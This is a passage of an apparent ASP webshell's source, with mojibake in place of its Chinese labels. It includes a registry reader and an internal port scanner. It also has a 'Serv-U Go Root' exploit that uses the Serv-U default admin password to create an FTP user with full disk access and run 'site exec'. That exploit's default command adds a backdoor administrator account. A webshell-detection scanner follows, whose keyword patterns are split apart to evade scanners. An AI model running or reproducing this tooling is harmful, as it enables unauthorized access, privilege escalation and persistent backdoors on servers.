RRS "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=ȱʡ,1=�����û��޷��оٱ����û��б�,2=�����û��޷����ӱ���IPC$����}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {��ֹĬ�Ϲ���}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {�ر����繲��}<br/>"
RRS "HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {����TCP/IPɸѡ(����������)}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {����IP·��}<br/>"
RRS "-------�����ƺ�Ҫ���󶨵�����,��֪���Ƿ�׼ȷ---------<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {Ĭ������}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {��DNS}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {�����TCP/IP�˿�}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {�����UDP�˿�}<br/>"
RRS "-----------OVER--------------------<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {����������}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {��ǰ����������(��������滻)}<br/>"
RRS "</span>"
RRS "</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
RRS "<li>" & theArray(i)
Next
Else
RRS "<li>" & theArray
End If
end if
end sub
sub ScanPort()
Server.ScriptTimeout = 7776000
if request.Form("port")="" then
PortList="21,23,25,80,110,135,139,445,1433,3306,3389,43958"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
RRS"<p>�˿�ɨ����</p>"
RRS"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
RRS"<p>Scan IP:&nbsp;"
RRS" <input name='ip' type='text' class='TextBox' id='ip' value='"&Request.ServerVariables("LOCAL_ADDR")&"' size='60'>"
RRS"<br>Port List:"
RRS"<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'>"
RRS"<br><br>"
RRS"<input name='submit' type='submit' class='buttom' value=' ɨ�� '>"
RRS"<input name='scan' type='hidden' id='scan' value='111'>"
RRS"</p></form>"
If request.Form("scan") <> "" Then
timer1 = timer
RRS("<b>ɨ�豨��:</b><br><hr>")
tmp = Split(request.Form("port"),",")
ip = Split(request.Form("ip"),",")
For hu = 0 to Ubound(ip)
If InStr(ip(hu),"-") = 0 Then
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then
Call Scan(ip(hu), tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ip(hu), j)
Next
Else
RRS(startN & " or " & endN & " is not number<br>")
End If
Else
RRS(tmp(i) & " is not number<br>")
End If
End If
Next
Else
ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then
Call Scan(ipStart & xxx, tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ipStart & xxx,j)
Next
Else
RRS(startN & " or " & endN & " is not number<br>")
End If
Else
RRS(tmp(i) & " is not number<br>")
End If
End If
Next
Next
End If
Next
timer2 = timer
thetime=cstr(int(timer2-timer1))
RRS"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
On Error Resume Next
set conn = Server.CreateObject("ADODB.connection")
connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
conn.ConnectionTimeout = 1
conn.open connstr
If Err Then
If Err.number = -2147217843 or Err.number = -2147467259 Then
If InStr(Err.description, "(Connect()).") > 0 Then
RRS(targetip & ":" & portNum & ".........�ر�<br>")
Else
RRS(targetip & ":" & portNum & ".........<font color=red>����</font><br>")
End If
End If
End If
End Sub
Select Case Action
Case "MainMenu":MainMenu()
Case "getTerminalInfo":getTerminalInfo()
case "ScanPort":ScanPort()
Case "Servu"
SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
"-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
"-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
"-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
"-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
"-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
"-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<center>�������� 127.0.0.1:"&port&",ʹ���û���: "&user&",���"&pass&"...<center>');"
RRS"setTimeout('document.all.goldsun.submit();',4000);"
RRS"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<center>��������Ȩ��,��ȴ���������<center>');"
RRS"setTimeout(""document.all.goldsun.submit();"",4000);"
RRS"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
a.send loginuser & loginpass & mt & deldomain & quit
set session("a")=a
RRS"<center>��Ȩ���,��ִ�������<br><font color=red>"&cmd&"</font><br><br>"
RRS"<input type=button value=' ���ؼ��� ' onClick=""location.href='?Action=Servu';"">"
RRS"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
RRS"<center><form method='post' name='goldsun'>"
RRS"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
RRS"<tr align='center' valign='middle'>"
RRS"<td colspan='2'>Serv-U Go Root</td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td width='100'>�û���:</td>"
RRS"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>�� �</td>"
RRS"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>�� �ڣ�</td>"
RRS"<td><input name='port' type='text' id='port' value='43958'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>ϵͳ·����</td>"
RRS"    <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
RRS"  </tr>"
RRS"  <tr align='center' valign='middle'>"
RRS"    <td>�����</td>"
RRS"    <td><input name='c' type='text' id='c' value='cmd /c net user SQLDebuger 123456 /add & net localgroup administrators SQLDebuger /add' size='50'></td>"
RRS"  </tr>"
RRS" <tr align='center' valign='middle'>"
RRS"    <td colspan='2'><input type='submit' name='Submit' value='�ύ'> "
RRS"<input type='reset' name='Submit2' value='����'>"
RRS"<input name='SUaction' type='hidden' id='action' value='1'></td>"
RRS"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function

Case "kmuma"
dim Report
if request.QueryString("act")<>"scan" then
RRS ("<b>��վ��Ŀ¼</b>- "&Server.MapPath("/")&"<br>")
RRS ("<b>������Ŀ¼</b>- "&Server.MapPath("."))

RRS "<form action=""?Action=kmuma&act=scan"" method=""post"" name=""form1"">"
RRS "<p><b>������Ҫ����·����</b>"
RRS "<input name=""path"" type=""text"" style=""border:1px solid #999"" value=""\"" size=""30"" /> �\����վ��Ŀ¼����.��Ϊ������Ŀ¼<br><br>"
RRS "��Ҫ��ʲô: <input class=c name=""radiobutton"" type=""radio"" value=""sws"" onClick=""document.getElementById('showFile1').style.display='none'"" checked>��ASP ��"
RRS "<input class=c type=""radio"" name=""radiobutton"" value=""sf"" onClick=""document.getElementById('showFile1').style.display=''"">������������֮�ļ�<br>"
RRS "<br /><div id=""showFile1"" style=""display:none"">"
RRS "&nbsp;&nbsp;�������ݣ�<input name=""Search_Content"" type=""text"" id=""Search_Content"" style=""border:1px solid #999"" size=""20"">"
RRS " Ҫ���ҵ��ַ����������ֻ�������ڼ��<br />"
RRS "&nbsp;&nbsp;�޸����ڣ�<input name=""Search_Date"" type=""text"" style=""border:1px solid #999"" value="""&Left(Now(),InStr(now()," ")-1)&""" size=""20""> ���������;����������������д <a href=""#"" onClick=""javascript:form1.Search_Date.value='ALL'"">ALL</a><br />"
RRS "&nbsp;&nbsp;�ļ����ͣ�<input name=""Search_FileExt"" type=""text"" style=""border:1px solid #999"" value=""*"" size=""20""> ����֮����,������*��ʾ��������<br /><br /></div>"
RRS "<input type=""submit"" value="" ��ʼɨ�� "" style=""background:#ccc;border:2px solid #fff;padding:2px 2px 0px 2px;margin:4px;"" />"
RRS "</form>"
else
if request.Form("path")="" then
RRS("·������Ϊ��")
response.End()
end if
if request.Form("path")="\" then
TmpPath = Server.MapPath("\")
elseif request.Form("path")="." then
TmpPath = Server.MapPath(".")
else
TmpPath = request.Form("path")
end if

timer1 = timer
Sun = 0
SumFiles = 0
SumFolders = 1
If request.Form("radiobutton") = "sws" Then
DimFileExt = "asp,cer,asa,cdx"
Call ShowAllFile(TmpPath)
Else
If request.Form("path") = "" or request.Form("Search_Date") = "" or request.Form("Search_FileExt") = "" Then
RRS("������������ȫ<br><br><a href='javascript:history.go(-1);'>�뷵����������</a>")
response.End()
End If
DimFileExt = request.Form("Search_fileExt")
Call ShowAllFile2(TmpPath)
End If
RRS "<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style='font-size:12px'>"
RRS "<tr><th>Scan WebShell</tr>"
RRS "<tr><td style=""padding:5px;line-height:170%;clear:both;font-size:12px"">"
RRS "<div id=""updateInfo"" style=""background:ffffe1;border:1px solid #89441f;padding:4px;display:none""></div>"
RRS "ɨ����ϣ�һ������ļ���<font color=""#FF0000"">"&SumFolders&"</font>�����ļ�<font color=""#FF0000"">"&SumFiles&"</font>�������ֿ��ɵ�<font color=""#FF0000"">"&Sun&"</font>��"
RRS "<table width=""100%"" border=""1"" cellpadding=""0"" cellspacing=""8"" bordercolor=""#999999"" style=""font-size:12px;border-collapse:collapse;line-height:130%;clear:both;""><tr>"
If request.Form("radiobutton") = "sws" Then
RRS "<td width=""20%"">�ļ����·��</td>"
RRS "<td width=""20%"">������</td>"
RRS "<td width=""40%"">����</td>"
RRS "<td width=""20%"">����/�޸�ʱ��</td>"
else
RRS "<td width=""50%"">�ļ����·��</td>"
RRS "<td width=""25%"">�ļ�����ʱ��</td>"
RRS "<td width=""25%"">�޸�ʱ��</td>"
end if
RRS "</tr>"
RRS Report
RRS "<br/></table>"
timer2 = timer
thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
RRS "<br><font style='font-size:12px'>��ҳִ�й�����"&thetime&"����</font>"
end if
Sub ShowAllFile(Path)
Set F1SO = CreateObject("Scripting.FileSystemObject")
if not F1SO.FolderExists(path) then exit sub
Set f = F1SO.GetFolder(Path)
Set fc2 = f.files
For Each myfile in fc2
If CheckExt(F1SO.GetExtensionName(path&"\"&myfile.name)) Then
Call ScanFile(Path&Temp&"\"&myfile.name, "")
SumFiles = SumFiles + 1
End If
Next
Set fc = f.SubFolders
For Each f1 in fc
ShowAllFile path&"\"&f1.name
SumFolders = SumFolders + 1
Next
Set F1SO = Nothing
End Sub
Sub ScanFile(FilePath, InFile)
Server.ScriptTimeout=999999999
If InFile <> "" Then
Infiles = "<font color=red>���ļ���<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>�ļ�����ִ��</font>"
End If
Set FSO1s = CreateObject("Scripting.FileSystemObject")
on error resume next
set ofile = FSO1s.OpenTextFile(FilePath)
filetxt = Lcase(ofile.readall())
If err Then Exit Sub end if
if len(filetxt)>0 then
filetxt = vbcrlf & filetxt
temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a><br />"
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>�༭</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>ɾ��</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>����</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>�ƶ�</a>"
If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
Report = Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell ���� clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>Σ�������һ�㱻ASPľ������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-=| ͬ�� |=-"
End if
If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
Report = Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application ���� clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>Σ�������һ�㱻ASPľ������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-=| ͬ�� |=-"
End If
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>�ƺ��ű���������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-=| ͬ�� |=-"
End If
regEx.Pattern = "\bEv"&"al\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()��������ִ������ASP����<br>����javascript������Ҳ����ʹ�ã��п������󱨡�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-=| ͬ�� |=-"
End If
regEx.Pattern = "[^.]\bExe"&"cute\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()��������ִ������ASP����</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-=| ͬ�� |=-"
End If
regEx.Pattern = "\.(Open|Create)TextFile\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>.CreateTextFile|.OpenTextFile</td><td>ʹ����FSO��CreateTextFile|OpenTextFile��д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-=| ͬ�� |=-"
End If
regEx.Pattern = "\.SaveToFile\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>.SaveToFile</td><td>ʹ����Stream��SaveToFile����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-=| ͬ�� |=-"
End If
regEx.Pattern = "\.Save\b"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>.Save</td><td>ʹ����XMLHTTP��Save����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
temp="-=| ͬ�� |=-"
End If
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()[^""]\)"
If regEx.Test(filetxt) Then
Report = Report&"<tr><td>"&temp&"</td><td>Server.Exec"&"ute</td><td><font color=red>���ܸ��ټ��Server.e"&"xecute()����ִ�е��ļ���</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
End If
Set Matches = Nothing
Set regEx = Nothing
Set XregEx = New RegExp
XregEx.IgnoreCase = True
XregEx.Global = True
XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
Set XMatches = XregEx.Execute(filetxt)
For Each Match in XMatches
tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
srcSeek = InStr(1, tmpLake2, "src", 1)
If srcSeek > 0 Then
srcSeek2 = instr(srcSeek, tmpLake2, "=")
For i = 1 To 50
tmp = Mid(tmpLake2, srcSeek2 + i, 1)
If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
Exit For
End If
Next
If tmp = """" Then
tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
Else
If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
End If
Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
SumFiles = SumFiles + 1
End If
Next
Set Matches = Nothing
Set regEx = Nothing
Set regEx = New RegExp
regEx.IgnoreCase = True
regEx.Global = True
regEx.Pattern = "CreateO"&"bject[ |\t]*\(.*\)"
Set Matches = regEx.Execute(filetxt)
For Each Match in Matches
If Instr(Match.Value, "&") or Instr(Match.Value, "+") or Instr(Match.Value, """") = 0 or Instr(Match.Value, "(") <> InStrRev(Match.Value, "(") Then
Report = Report&"<tr><td>"&temp&"</td><td>Creat"&"eObject</td><td>Crea"&"teObject����ʹ���˱��μ���"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
Sun = Sun + 1
exit sub
End If
Next
Set Matches = Nothing
Set regEx = Nothing
end if
set ofile = nothing
set FSO1s = nothing
End Sub
Function CheckExt(FileExt)
If DimFileExt = "*" Then CheckExt = True
Ext = Split(DimFileExt,",")
For i = 0 To Ubound(Ext)
If Lcase(FileExt) = Ext(i) Then
CheckExt = True
Exit Function
End If
Next
End Function
Function GetDateModify(filepath)
Set F2SO = CreateObject("Scripting.FileSystemObject")
Set f = F2SO.GetFile(filepath)
s = f.DateLastModified
set f = nothing
set F2SO = nothing
GetDateModify = s
End Function
Function GetDateCreate(filepath)
Set F3SO = CreateObject("Scripting.FileSystemObject")
Set f = F3SO.GetFile(filepath)
s = f.DateCreated
set f = nothing
set F3SO = nothing
GetDateCreate = s
End Function
Function tURLEncode(Str)
temp = Replace(Str, "%", "%25")
temp = Replace(temp, "#", "%23")
temp = Replace(temp, "&", "%26")
tURLEncode = temp
End Function
Sub ShowAllFile2(Path)
Set F4SO = CreateObject("Scripting.FileSystemObject")
if not F4SO.FolderExists(path) then exit sub
Set f = F4SO.GetFolder(Path)
Set fc2 = f.files
For Each myfile in fc2
If CheckExt(F4SO.GetExtensionName(path&"\"&myfile.name)) Then
Call IsFind(Path&"\"&myfile.name)
SumFiles = SumFiles + 1
End If
Next
Set fc = f.SubFolders
For Each f1 in fc
ShowAllFile2 path&"\"&f1.name
SumFolders = SumFolders + 1
Next
Set F4SO = Nothing
End Sub
Sub IsFind(thePath)
theDate = GetDateModify(thePath)
on error resume next
theTmp = Mid(theDate, 1, Instr(theDate, " ") - 1)
if err then exit Sub
xDate = Split(request.Form("Search_Date"),";")
If request.Form("Search_Date") = "ALL" Then ALLTime = True
For i = 0 To Ubound(xDate)
If theTmp = xDate(i) or ALLTime = True Then
If request("Search_Content") <> "" Then
Set FSO2s = CreateObject("Scripting.FileSystemObject")
set ofile = FSO2s.OpenTextFile(thePath, 1, false, -2)
filetxt = Lcase(ofile.readall())
If Instr( filetxt, LCase(request.Form("Search_Content"))) > 0 Then
temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
temp=temp&" �� <a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>�༭</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>ɾ��</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>����</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>�ƶ�</a>"
Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Report = Report&"<tr><td>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Sun = Sun + 1
Exit Sub
End If
ofile.close()
Set ofile = Nothing
Set FSO2s = Nothing
Else
temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>�༭</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>ɾ��</a > "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>����</a> "
temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>�ƶ�</a>"
